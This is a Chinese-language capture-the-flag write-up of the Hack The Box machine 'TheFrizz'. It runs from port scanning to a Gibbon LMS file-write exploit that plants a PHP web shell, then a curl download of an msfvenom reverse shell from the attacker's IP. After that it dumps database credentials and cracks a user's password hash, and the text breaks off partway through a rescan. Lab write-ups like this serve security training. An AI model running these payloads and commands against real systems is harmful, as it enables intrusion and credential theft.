{"pageProps":{"postData":{"id":"HackTheBoxSeason7-TheFrizz","contentHtml":"<h1>Season7-TheFrizz</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/652\">https://app.hackthebox.com/machines/652</a> | <code>medium</code> | <code>Windows</code>靶机</p>\n</blockquote>\n<h2>前期踩点</h2>\n<p>进行<code>nmap</code>扫描</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/TheFrizz  nmap -sT -min-rate 10000 -p- 10.10.11.60     \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-16 10:52 EDT\nStats: 0:00:44 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan\nConnect Scan Timing: About 31.29% <span class=\"hljs-keyword\">done</span>; ETC: 10:54 (0:01:23 remaining)\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.60\nHost is up (0.21s latency).\nNot shown: 65515 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n22/tcp    open  ssh\n53/tcp    open  domain\n80/tcp    open  http\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n9389/tcp  open  adws\n49664/tcp open  unknown\n49668/tcp open  unknown\n49670/tcp open  unknown\n57439/tcp open  unknown\n57443/tcp open  unknown\n57453/tcp open  unknown\n</code></pre>\n<p>发现域名<code>frizzdc.frizz.htb</code> 添加到<code>hosts</code> 文件</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/TheFrizz  nmap -sT -A -T4 -O -p 22,53,80,88,135,139,389,445,593,636,3268,3269,9389 10.10.11.60\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-16 10:57 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.60\nHost is up (0.25s latency).\n\nPORT     STATE SERVICE       VERSION\n22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)\n53/tcp   open  domain        Simple DNS Plus\n80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)\n|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server <span class=\"hljs-keyword\">time</span>: 2025-03-16 21:39:50Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\n9389/tcp open  mc-nmf        .NET Message Framing\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022 (89%)\nAggressive OS guesses: Microsoft Windows Server 2022 (89%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (<span class=\"hljs-built_in\">test</span> conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   <span class=\"hljs-built_in\">date</span>: 2025-03-16T21:40:19\n|_  start_date: N/A\n|_clock-skew: 6h41m46s\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   197.91 ms 10.10.16.1\n2   271.29 ms 10.10.11.60\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 85.70 seconds\n</code></pre>\n<p>漏洞扫描</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/TheFrizz  nmap -script=vuln -p 22,53,80,88,135,139,389,445,593,636,3268,3269,9389 10.10.11.60\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-16 11:01 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> frizz.htb (10.10.11.60)\nHost is up (0.26s latency).\n\nPORT     STATE SERVICE\n22/tcp   open  ssh\n53/tcp   open  domain\n80/tcp   open  http\n|_http-dombased-xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.\n| http-slowloris-check: \n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2007-6750\n|       Slowloris tries to keep many connections to the target web server open and hold\n|       them open as long as possible.  It accomplishes this by opening connections to\n|       the target web server and sending a partial request. By doing so, it starves\n|       the http server'</span>s resources causing Denial Of Service.\n|       \n|     Disclosure <span class=\"hljs-built_in\">date</span>: 2009-09-17\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750\n|_      http://ha.ckers.org/slowloris/\n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\n|_http-csrf: Couldn'</span>t find any CSRF vulnerabilities.\n| http-enum: \n|_  /home/: Potentially interesting folder\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n|_ssl-ccs-injection: No reply from server (TIMEOUT)\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n|_ssl-ccs-injection: No reply from server (TIMEOUT)\n9389/tcp open  adws\n\nHost script results:\n|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR\n|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR\n|_smb-vuln-ms10-054: <span class=\"hljs-literal\">false</span>\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 324.48 seconds\n</code></pre>\n<p>先尝试<code>SMB</code>是否允许匿名用户</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/TheFrizz  smbclient -L 10.10.11.60 -U anonymous\nsession setup failed: NT_STATUS_NOT_SUPPORTED\n</code></pre>\n<h2>WEB 渗透</h2>\n<p>访问HTTP服务，貌似是一个教育平台</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-TheFrizz/image44.png\" alt=\"image.png\"></p>\n<p>在主页下面发现，一串<code>base64</code>编码的文字</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-TheFrizz/image45.png\" alt=\"image.png\"></p>\n<p>对其进行解码</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-TheFrizz/image46.png\" alt=\"image.png\"></p>\n<p>翻译下来就是：想学习黑客技术但又不想坐牢？您将在国际水域的安全环境中了解 Syscalls 和 XSS 的来龙去脉，并了解客户签订的铁定合同，这些内容均由 Walkerville 最优秀的律师审阅。</p>\n<p>提到了<code>Syscalls</code> 和 <code>XSS</code> ，但不知道有什么用，后面可能会用到</p>\n<p>头部上有 <code>Staff login</code> ，点击跳转</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-TheFrizz/image47.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">\nWelcome\n\n*NOTICE** Due to unplanned Pentesting by students, WES is migrating applications and tools to stronger security protocols. During this transition, Ms. Fiona Frizzle will be migrating Gibbon to utilize our Azure Active Directory SSO. Please note this might take 48 hours <span class=\"hljs-built_in\">where</span> your accounts will not be available. Please bear with us, and thank you <span class=\"hljs-keyword\">for</span> your patience. Anything that can not utilize Azure AD will use the strongest available protocols such as Kerberos.\n欢迎\n\n*注意** 由于学生进行计划外的渗透测试，WES 正在将应用程序和工具迁移到更强大的安全协议。在此过渡期间，Fiona Frizzle 女士将迁移 Gibbon 以利用我们的 Azure Active Directory SSO。请注意，这可能需要 48 小时，在此期间您的帐户将不可用。请耐心等待，感谢您的耐心。任何无法使用 Azure AD 的东西都将使用最强大的可用协议，例如 Kerberos。\n</code></pre>\n<p>左边选项是学生申请，右边是员工申请</p>\n<p>我们可以知道这里是使用<code>Gibbon v25</code>搭建的，通过网上搜寻是否存在漏洞</p>\n<p>经搜索存在本地文件包含漏洞 <strong>CVE-2023-34598</strong>：<a href=\"https://github.com/maddsec/CVE-2023-34598\">https://github.com/maddsec/CVE-2023-34598</a></p>\n<blockquote>\n<p>但是，需要注意的是，此漏洞仅对位于安装文件夹中的文件和特定条件有效，例如，不包括 PHP 文件</p>\n</blockquote>\n<p>我们参照<code>POC</code>进行本地文件包含<code>gibbon.sql</code> ，成功复现</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-TheFrizz/image48.png\" alt=\"image.png\"></p>\n<p>对当前安装目录进行扫描，寻找是否存在能进行包含的敏感文件</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/TheFrizz  gobuster <span class=\"hljs-built_in\">dir</span> -u http://frizzdc.frizz.htb/Gibbon-LMS/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403,502,429 --no-error -x php,asp,zip,txt\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://frizzdc.frizz.htb/Gibbon-LMS/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404,403,502,429\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,asp,zip,txt\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/index.php            (Status: 200) [Size: 22064]\n/login.php            (Status: 302) [Size: 0] [--> /Gibbon-LMS/index.php?loginReturn=fail0]\n/resources            (Status: 301) [Size: 361] [--> http://frizzdc.frizz.htb/Gibbon-LMS/resources/]\n/themes               (Status: 301) [Size: 358] [--> http://frizzdc.frizz.htb/Gibbon-LMS/themes/]\n/modules              (Status: 301) [Size: 359] [--> http://frizzdc.frizz.htb/Gibbon-LMS/modules/]\n/uploads              (Status: 301) [Size: 359] [--> http://frizzdc.frizz.htb/Gibbon-LMS/uploads/]\n/version.php          (Status: 200) [Size: 0]\n/privacypolicy.php    (Status: 200) [Size: 524]\n/report.php           (Status: 200) [Size: 2617]\n/Index.php            (Status: 200) [Size: 22064]\n/license              (Status: 200) [Size: 35113]\n/lib                  (Status: 301) [Size: 355] [--> http://frizzdc.frizz.htb/Gibbon-LMS/lib/]\n/src                  (Status: 301) [Size: 355] [--> http://frizzdc.frizz.htb/Gibbon-LMS/src/]\n/update.php           (Status: 200) [Size: 660]\n/Login.php            (Status: 302) [Size: 0] [--> /Gibbon-LMS/index.php?loginReturn=fail0]\n/Resources            (Status: 301) [Size: 361] [--> http://frizzdc.frizz.htb/Gibbon-LMS/Resources/]\n/PrivacyPolicy.php    (Status: 200) [Size: 524]\n/logout.php           (Status: 302) [Size: 0] [--> /Gibbon-LMS/index.php]\n/preferences.php      (Status: 200) [Size: 374]\n/changelog.txt        (Status: 200) [Size: 103023]\n/ChangeLog.txt        (Status: 200) [Size: 103023]\n/Themes               (Status: 301) [Size: 358] [--> http://frizzdc.frizz.htb/Gibbon-LMS/Themes/]\n/vendor               (Status: 301) [Size: 358] [--> http://frizzdc.frizz.htb/Gibbon-LMS/vendor/]\n/config.php           (Status: 200) [Size: 0]\n/error.php            (Status: 200) [Size: 2845]\n/LICENSE              (Status: 200) [Size: 35113]\n/privacyPolicy.php    (Status: 200) [Size: 524]\n/functions.php        (Status: 200) [Size: 0]\n/INDEX.php            (Status: 200) [Size: 22064]\n/License              (Status: 200) [Size: 35113]\n/Modules              (Status: 301) [Size: 359] [--> http://frizzdc.frizz.htb/Gibbon-LMS/Modules/]\n/CHANGELOG.txt        (Status: 200) [Size: 103023]\n</code></pre>\n<p>扫描过于慢，可能是不需要进行爆破，暂时没有读到任何有效的文件</p>\n<p>然后在网上可以找到（<code>intext:Arbitrary File Write gibbon</code>）：<a href=\"https://herolab.usd.de/security-advisories/usd-2023-0025/\">https://herolab.usd.de/security-advisories/usd-2023-0025/</a> 另外一个任意文件写入的漏洞</p>\n<p>验证POC：</p>\n<blockquote>\n<p>The following request will write the payload <strong></strong> to the file <strong>asdf.php</strong>.</p>\n</blockquote>\n<pre><code class=\"hljs language-bash\">POST /modules/Rubrics/rubrics_visualise_saveAjax.php HTTP/1.1\nHost: localhost:8080\n[...]\n\nimg=image/png;asdf,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKT8%2b&#x26;path=asdf.php&#x26;gibbonPersonID=0000000001\n</code></pre>\n<p>构造Payload：</p>\n<pre><code class=\"hljs language-bash\">curl -X POST -d <span class=\"hljs-string\">\"img=image/png;asdf,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKT8%2b&#x26;path=asdf.php&#x26;gibbonPersonID=0000000001\"</span> http://frizzdc.frizz.htb/Gibbon-LMS//modules/Rubrics/rubrics_visualise_saveAjax.php\n</code></pre>\n<p>访问<code>asdf.php</code> 并添加<code>cmd</code>参数，成功回显！</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-TheFrizz/image49.png\" alt=\"image.png\"></p>\n<p>将<code>shell</code>弹到<code>MSF</code>上</p>\n<pre><code class=\"hljs language-bash\">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.16.54 lport=1234 -f exe -o getshell.exe\n</code></pre>\n<p>开启监听</p>\n<pre><code class=\"hljs language-bash\">msf6 > use exploit/multi/handler \n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> payload windows/x64/meterpreter/reverse_tcp\npayload => windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > options\n\nPayload options (windows/x64/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          <span class=\"hljs-built_in\">yes</span>       Exit technique (Accepted: <span class=\"hljs-string\">''</span>, seh, thread, process, none)\n   LHOST                      <span class=\"hljs-built_in\">yes</span>       The listen address (an interface may be specified)\n   LPORT     4444             <span class=\"hljs-built_in\">yes</span>       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n\nView the full module info with the info, or info -d <span class=\"hljs-built_in\">command</span>.\n\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lhost 10.10.16.54\nlhost => 10.10.16.54\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lport 1234\nlport => 1234\nmsf6 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on 10.10.16.54:1234 \n\n</code></pre>\n<p>下载<code>payload</code></p>\n<pre><code class=\"hljs language-bash\">http://frizzdc.frizz.htb/Gibbon-LMS/asdf.php?cmd=curl 10.10.16.54:8081/getshell.exe -o ./getshell.exe\n</code></pre>\n<p>执行恶意<code>exe</code></p>\n<pre><code class=\"hljs language-bash\">http://frizzdc.frizz.htb/Gibbon-LMS/asdf.php?cmd=getshell.exe\n</code></pre>\n<p>成功上线</p>\n<pre><code class=\"hljs language-bash\">msf6 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on 10.10.16.54:1234 \n[*] Meterpreter session 1 opened (10.10.16.54:1234 -> 10.10.11.60:55047) at 2025-03-17 00:55:40 -0400\n\nmeterpreter >\n</code></pre>\n<h2>靶机信息搜集</h2>\n<pre><code class=\"hljs language-bash\">meterpreter > <span class=\"hljs-built_in\">pwd</span>\nC:\\xampp\\htdocs\\Gibbon-LMS\n</code></pre>\n<pre><code class=\"hljs language-bash\">meterpreter > sysinfo\nComputer        : FRIZZDC\nOS              : Windows Server 2022 (10.0 Build 20348).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : frizz\nLogged On Users : 8\nMeterpreter     : x64/windows\n</code></pre>\n<pre><code class=\"hljs language-bash\">meterpreter > ipconfig\n\nInterface  1\n============\nName         : Software Loopback Interface 1\nHardware MAC : 00:00:00:00:00:00\nMTU          : 4294967295\nIPv4 Address : 127.0.0.1\nIPv4 Netmask : 255.0.0.0\nIPv6 Address : ::1\nIPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff\n\nInterface  5\n============\nName         : vmxnet3 Ethernet Adapter\nHardware MAC : 00:50:56:b9:e0:3d\nMTU          : 1500\nIPv4 Address : 10.10.11.60\nIPv4 Netmask : 255.255.254.0\nIPv6 Address : dead:beef::74cf:55b5:140b:9cb9\nIPv6 Netmask : ffff:ffff:ffff:ffff::\nIPv6 Address : fe80::4fb:be40:ce61:9c2a\nIPv6 Netmask : ffff:ffff:ffff:ffff::\n</code></pre>\n<pre><code class=\"hljs language-bash\">meterpreter > getuid\nServer username: frizz\\w.Webservice\n</code></pre>\n<pre><code class=\"hljs language-bash\">C:\\xampp\\htdocs\\Gibbon-LMS>net user\nnet user\n\nUser accounts <span class=\"hljs-keyword\">for</span> \\\\FRIZZDC\n\n-------------------------------------------------------------------------------\na.perlstein              Administrator            c.ramon                  \nc.sandiego               d.hudson                 f.frizzle                \ng.frizzle                Guest                    h.arm                    \nJ.perlstein              k.franklin               krbtgt                   \nl.awesome                m.ramon                  M.SchoolBus              \np.terese                 r.tennelli               t.wright                 \nv.frizzle                w.li                     w.Webservice             \nThe <span class=\"hljs-built_in\">command</span> completed successfully.\n</code></pre>\n<pre><code class=\"hljs language-bash\">C:\\xampp\\htdocs\\Gibbon-LMS><span class=\"hljs-built_in\">whoami</span> /priv\n<span class=\"hljs-built_in\">whoami</span> /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State   \n============================= ============================== ========\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled \nSeCreateGlobalPrivilege       Create global objects          Enabled \nSeIncreaseWorkingSetPrivilege Increase a process working <span class=\"hljs-built_in\">set</span> Disabled\n</code></pre>\n<pre><code class=\"hljs language-bash\">C:\\xampp\\htdocs\\Gibbon-LMS>wmic useraccount get /all\nwmic useraccount get /all\nAccountType  Caption              Description                                               Disabled  Domain  FullName               InstallDate  LocalAccount  Lockout  Name           PasswordChangeable  PasswordExpires  PasswordRequired  SID                                             SIDType  Status    \n512          frizz\\Administrator  Built-<span class=\"hljs-keyword\">in</span> account <span class=\"hljs-keyword\">for</span> administering the computer/domain    FALSE     frizz                                       FALSE         FALSE    Administrator  TRUE                TRUE             TRUE              S-1-5-21-2386970044-1145388522-2932701813-500   1        OK        \n512          frizz\\Guest          Built-<span class=\"hljs-keyword\">in</span> account <span class=\"hljs-keyword\">for</span> guest access to the computer/domain  TRUE      frizz                                       FALSE         FALSE    Guest          TRUE                FALSE            FALSE             S-1-5-21-2386970044-1145388522-2932701813-501   1        Degraded  \n512          frizz\\krbtgt         Key Distribution Center Service Account                   TRUE      frizz                                       FALSE         FALSE    krbtgt         TRUE                TRUE             TRUE              S-1-5-21-2386970044-1145388522-2932701813-502   1        Degraded  \n512          frizz\\f.frizzle      Wizard <span class=\"hljs-keyword\">in</span> Training                                        FALSE     frizz   fiona frizzle                       FALSE         FALSE    f.frizzle      TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1103  1        OK        \n512          frizz\\w.li           Student                                                   FALSE     frizz   wanda li                            FALSE         FALSE    w.li           TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1104  1        OK        \n512          frizz\\h.arm          Student                                                   FALSE     frizz   harry arm                           FALSE         FALSE    h.arm          TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1105  1        OK        \n512          frizz\\M.SchoolBus    Desktop Administrator                                     FALSE     frizz   Marvin SchoolBus                    FALSE         FALSE    M.SchoolBus    TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1106  1        OK        \n512          frizz\\d.hudson       Student                                                   FALSE     frizz   dorothy hudson                      FALSE         FALSE    d.hudson       TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1107  1        OK        \n512          frizz\\k.franklin     Student                                                   FALSE     frizz   keesha franklin                     FALSE         FALSE    k.franklin     TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1108  1        OK        \n512          frizz\\l.awesome      Student                                                   FALSE     frizz   liz awesome                         FALSE         FALSE    l.awesome      TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1109  1        OK        \n512          frizz\\t.wright       Student                                                   FALSE     frizz   tim wright                          FALSE         FALSE    t.wright       TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1110  1        OK        \n512          frizz\\r.tennelli     Student                                                   FALSE     frizz   ralphie tennelli                    FALSE         FALSE    r.tennelli     TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1111  1        OK        \n512          frizz\\J.perlstein    Student                                                   FALSE     frizz   Janet perlstein                     FALSE         FALSE    J.perlstein    TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1112  1        OK        \n512          frizz\\a.perlstein    Student                                                   FALSE     frizz   arnold perlstein                    FALSE         FALSE    a.perlstein    TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1113  1        OK        \n512          frizz\\p.terese       Student                                                   FALSE     frizz   phoebe terese                       FALSE         FALSE    p.terese       TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1114  1        OK        \n512          frizz\\v.frizzle      The Wizard                                                FALSE     frizz   valerie frizzle                     FALSE         FALSE    v.frizzle      TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1115  1        OK        \n512          frizz\\g.frizzle      Student                                                   FALSE     frizz   goldie frizzle                      FALSE         FALSE    g.frizzle      TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1116  1        OK        \n512          frizz\\c.sandiego     Student                                                   FALSE     frizz   carmen sandiego                     FALSE         FALSE    c.sandiego     TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1117  1        OK        \n512          frizz\\c.ramon        Student                                                   FALSE     frizz   carlos ramon                        FALSE         FALSE    c.ramon        TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1118  1        OK        \n512          frizz\\m.ramon        Student                                                   FALSE     frizz   mikey ramon                         FALSE         FALSE    m.ramon        TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1119  1        OK        \n512          frizz\\w.Webservice   Service <span class=\"hljs-keyword\">for</span> the website                                   FALSE     frizz   webservice Webservice               FALSE         FALSE    w.Webservice   TRUE                FALSE            TRUE              S-1-5-21-2386970044-1145388522-2932701813-1120  1        OK        \n</code></pre>\n<p>上传<code>Winpeas</code>进行信息收集，方便后面使用</p>\n<pre><code class=\"hljs language-bash\">meterpreter > upload winPEASx64.exe\n[*] Uploading  : /root/Desktop/test/TheFrizz/winPEASx64.exe -> winPEASx64.exe\n</code></pre>\n<pre><code class=\"hljs language-bash\">C:\\xampp\\htdocs\\Gibbon-LMS>winPEASx64.exe > info.txt\n</code></pre>\n<pre><code class=\"hljs language-bash\">meterpreter > download info.txt\n[*] Downloading: info.txt -> /root/Desktop/test/TheFrizz/info.txt\n[*] Downloaded 351.36 KiB of 351.36 KiB (100.0%): info.txt -> /root/Desktop/test/TheFrizz/info.txt\n[*] Completed  : info.txt -> /root/Desktop/test/TheFrizz/info.txt\n</code></pre>\n<p>对敏感信息进行收集，找到数据库的账户和密码</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-variable\">$databaseServer</span> = <span class=\"hljs-string\">'localhost'</span>;\n<span class=\"hljs-variable\">$databaseUsername</span> = <span class=\"hljs-string\">'MrGibbonsDB'</span>;\n<span class=\"hljs-variable\">$databasePassword</span> = <span class=\"hljs-string\">'MisterGibbs!Parrot!?1'</span>;\n<span class=\"hljs-variable\">$databaseName</span> = <span class=\"hljs-string\">'gibbon'</span>;\n</code></pre>\n<p>尝试Dump数据，但是当前<code>shell</code>没办法交互</p>\n<pre><code class=\"hljs language-bash\"> mysql.exe -u MrGibbonsDB -p<span class=\"hljs-string\">\"MisterGibbs!Parrot!?1\"</span> -e <span class=\"hljs-string\">\"show databases;\"</span>\n</code></pre>\n<p>进入<code>powershell</code></p>\n<pre><code class=\"hljs language-bash\">C:\\xampp\\mysql\\bin>powershell\npowershell\nWindows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nInstall the latest PowerShell <span class=\"hljs-keyword\">for</span> new features and improvements! https://aka.ms/PSWindows\n\nPS C:\\xampp\\mysql\\bin> \n</code></pre>\n<p>再次进行Dump数据</p>\n<pre><code class=\"hljs language-bash\"> ./mysql.exe -u MrGibbonsDB -p<span class=\"hljs-string\">\"MisterGibbs!Parrot!?1\"</span> -e <span class=\"hljs-string\">\"show databases;\"</span>\n atabase\ngibbon\ninformation_schema\n<span class=\"hljs-built_in\">test</span>\n</code></pre>\n<pre><code class=\"hljs language-bash\"> ./mysql.exe -u MrGibbonsDB -p<span class=\"hljs-string\">\"MisterGibbs!Parrot!?1\"</span> -e <span class=\"hljs-string\">\"use gibbon;show tables;\"</span>\n many data...but work...\n</code></pre>\n<pre><code class=\"hljs language-bash\">./mysql.exe -u MrGibbonsDB -p<span class=\"hljs-string\">\"MisterGibbs!Parrot!?1\"</span> -e <span class=\"hljs-string\">\"use gibbon;select * from gibbonperson;\"</span>\ngibbonPersonID  title   surname firstName       preferredName   officialName    nameInCharacters        gender  username        passwordStrong  passwordStrongSalt      passwordForceReset      status  canLogin  gibbonRoleIDPrimary      gibbonRoleIDAll dob     email   emailAlternate  image_240       lastIPAddress   lastTimestamp   lastFailIPAddress       lastFailTimestamp       failCount       address1        address1District   address1Country address2        address2District        address2Country phone1Type      phone1CountryCode       phone1  phone3Type      phone3CountryCode       phone3  phone2Type      phone2CountryCode phone2   phone4Type      phone4CountryCode       phone4  website languageFirst   languageSecond  languageThird   countryOfBirth  birthCertificateScan    ethnicity       religion        profession      employer  jobTitle emergency1Name  emergency1Number1       emergency1Number2       emergency1Relationship  emergency2Name  emergency2Number1       emergency2Number2       emergency2Relationship  gibbonHouseID   studentID dateStart        dateEnd gibbonSchoolYearIDClassOf       lastSchool      nextSchool      departureReason transport       transportNotes  calendarFeedPersonal    viewCalendarSchool      viewCalendarPersonal    viewCalendarSpaceBooking   gibbonApplicationFormID lockerNumber    vehicleRegistration     personalBackground      messengerLastRead       privacy dayType gibbonThemeIDPersonal   gibboni18nIDPersonal    studentAgreements  googleAPIRefreshToken   microsoftAPIRefreshToken        genericAPIRefreshToken  receiveNotificationEmails       mfaSecret       mfaToken        cookieConsent   fields\n0000000001      Ms.     Frizzle Fiona   Fiona   Fiona Frizzle           Unspecified     f.frizzle       067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03        /aACFhikmNopqrRTVz2489  N       Full       Y       001     001     NULL    f.frizzle@frizz.htb     NULL    NULL    ::1     2024-10-29 09:28:59     10.10.16.70     2025-03-17 00:47:02     4                                                         NULL             NULL    NULL    NULL                                                    Y       Y       N       NULL                            NULL    NULL    NULL    NULL    NULL    NULL                      YNULL    NULL    NULL\n</code></pre>\n<p>拿到了<code>Frizzle Fiona</code>用户的密码<code>hash</code>和<code>salt</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">hash</span>:067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03\nsalt:/aACFhikmNopqrRTVz2489\n</code></pre>\n<p>看着像是<code>sha-256</code> ，尝试使用<code>hashcat</code>破解</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-TheFrizz/image50.png\" alt=\"image.png\"></p>\n<p>将得到密码格式改为</p>\n<pre><code class=\"hljs language-bash\">067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489\n</code></pre>\n<p>破解，得到密码 <code>Jenni_Luvs_Magic23</code> ，并且通过之前的信息可以知道是大概是域用户<code>f.frizzle</code>的凭据</p>\n<pre><code class=\"hljs language-bash\">hashcat -m 1420 <span class=\"hljs-string\">\"067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489\"</span> /usr/share/wordlists/rockyou.txt\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason7-TheFrizz/image51.png\" alt=\"image.png\"></p>\n<h2>枚举用户可用服务</h2>\n<blockquote>\n<p>在上面使用的是新加坡节点，到这里使用 <code>US</code> 的<code>Release Arena</code> 节点，IP地址改为了<code>10.129.224.51</code></p>\n</blockquote>\n<p>我们再次扫描端口，可以发现使用了US节点后开启<code>5985</code>端口</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/TheFrizz  nmap -sT -min-rate 10000 -p- 10.129.224.5\n1\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-18 03:49 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> frizz.htb (10.129.224.51)\nHost is up (0.38s latency).\nNot shown: 65516 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n22/tcp    open  ssh\n53/tcp    open  domain\n80/tcp    open  